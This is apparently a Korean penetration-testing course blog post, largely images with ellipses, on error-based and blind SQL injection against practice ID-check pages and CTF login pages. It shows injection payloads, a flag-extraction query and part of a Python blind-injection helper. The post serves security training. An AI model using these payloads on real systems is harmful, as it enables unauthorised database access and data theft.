...
![Error-Based SQL Injection](/data/Penetration%20Testing%20|%20Week%207/1.webp)

아이디의 중복 검사 기능을 지원하는 간이 웹 사이트이다. 예시 검색어 `normaltic`을 입력해 보자.

![Error-Based SQL Injection](/data/Penetration%20Testing%20|%20Week%207/2.webp)
...
![Error-Based SQL Injection](/data/Penetration%20Testing%20|%20Week%207/3.webp)
...
![Error-Based SQL Injection](/data/Penetration%20Testing%20|%20Week%207/4.webp)
...
![Error-Based SQL Injection](/data/Penetration%20Testing%20|%20Week%207/5.webp)
...
![Error-Based SQL Injection](/data/Penetration%20Testing%20|%20Week%207/6.webp)
...
![Blind SQL Injection](/data/Penetration%20Testing%20|%20Week%207/7.webp)

마찬가지로 아이디 중복 검사를 수행하는 웹 사이트이다. SQL Injection이 가능한지 파악하기 위해 `AND` 연산을 활용한 페이로드를 삽입해 보자.

![Blind SQL Injection](/data/Penetration%20Testing%20|%20Week%207/8.webp)
![Blind SQL Injection](/data/Penetration%20Testing%20|%20Week%207/9.webp)

서버 측에서 실행되는 SQL 쿼리의 반환 결과 유무에 따라 아이디의 존재 여부를 알리는 메시지가 출력된다.

![Blind SQL Injection](/data/Penetration%20Testing%20|%20Week%207/10.webp)
...
![Blind SQL Injection](/data/Penetration%20Testing%20|%20Week%207/11.webp)
...
>
> /* Example */
> SUBSTR('test', 1, 1) -- 반환값: t
> SUBSTR('test', 2, 2) -- 반환값: es
> ```
...
![Blind SQL Injection](/data/Penetration%20Testing%20|%20Week%207/12.webp)
...
![SQL Injection CTF](/data/Penetration%20Testing%20%7C%20Week%207/13.webp)
...
<img src="/data/Penetration%20Testing%20%7C%20Week%207/14.webp" alt="SQL Injection 3" style="padding: 0 25%; background-color: white">

링크의 주소로 접속하면 다음과 같은 로그인 페이지로 이동한다.

![SQL Injection 3](/data/Penetration%20Testing%20%7C%20Week%207/15.webp)
...
![SQL Injection 3](/data/Penetration%20Testing%20%7C%20Week%207/16.webp)
...
![SQL Injection 3](/data/Penetration%20Testing%20%7C%20Week%207/17.webp)
...
![SQL Injection 3](/data/Penetration%20Testing%20%7C%20Week%207/18.webp)
...
![SQL Injection 3](/data/Penetration%20Testing%20%7C%20Week%207/19.webp)

`flag`라는 컬럼명이 추출되었다. 마지막으로 페이로드에 `select flag from flag_table limit 0, 1`을 삽입하여 플래그 추출을 시도하였다.

![SQL Injection 3](/data/Penetration%20Testing%20%7C%20Week%207/20.webp)
...
<img src="/data/Penetration%20Testing%20%7C%20Week%207/21.webp" alt="SQL Injection 4" style="padding: 0 25%; background-color: white">
...
![SQL Injection 4](/data/Penetration%20Testing%20%7C%20Week%207/22.webp)
...
![SQL Injection 4](/data/Penetration%20Testing%20%7C%20Week%207/23.webp)
![SQL Injection 4](/data/Penetration%20Testing%20%7C%20Week%207/24.webp)
...
![SQL Injection 4](/data/Penetration%20Testing%20%7C%20Week%207/25.webp)
![SQL Injection 4](/data/Penetration%20Testing%20%7C%20Week%207/26.webp)
![SQL Injection 4](/data/Penetration%20Testing%20%7C%20Week%207/27.webp)
![SQL Injection 4](/data/Penetration%20Testing%20%7C%20Week%207/28.webp)
![SQL Injection 4](/data/Penetration%20Testing%20%7C%20Week%207/29.webp)
![SQL Injection 4](/data/Penetration%20Testing%20%7C%20Week%207/30.webp)
![SQL Injection 4](/data/Penetration%20Testing%20%7C%20Week%207/31.webp)
![SQL Injection 4](/data/Penetration%20Testing%20%7C%20Week%207/32.webp)
...
<img src="/data/Penetration%20Testing%20%7C%20Week%207/33.webp" alt="SQL Injection 5" style="padding: 0 25%; background-color: white">
...
![SQL Injection 4](/data/Penetration%20Testing%20%7C%20Week%207/34.webp)
![SQL Injection 4](/data/Penetration%20Testing%20%7C%20Week%207/35.webp)
![SQL Injection 4](/data/Penetration%20Testing%20%7C%20Week%207/36.webp)
![SQL Injection 4](/data/Penetration%20Testing%20%7C%20Week%207/37.webp)
...
![SQL Injection 4](/data/Penetration%20Testing%20%7C%20Week%207/38.webp)
...
<img src="/data/Penetration%20Testing%20%7C%20Week%207/39.webp" alt="SQL Injection 6" style="padding: 0 25%; background-color: white">
...
def is_true(row, idx, asc):
  if sql.strip().lower() == "select database()" and row > 0:
    return False
  payload = f"normaltic' and (ascii(substr(({sql} limit {row}, 1), {idx}, 1)) > {asc}) and '1' = '1"
...
![SQL Injection 4](/data/Penetration%20Testing%20%7C%20Week%207/40.webp)
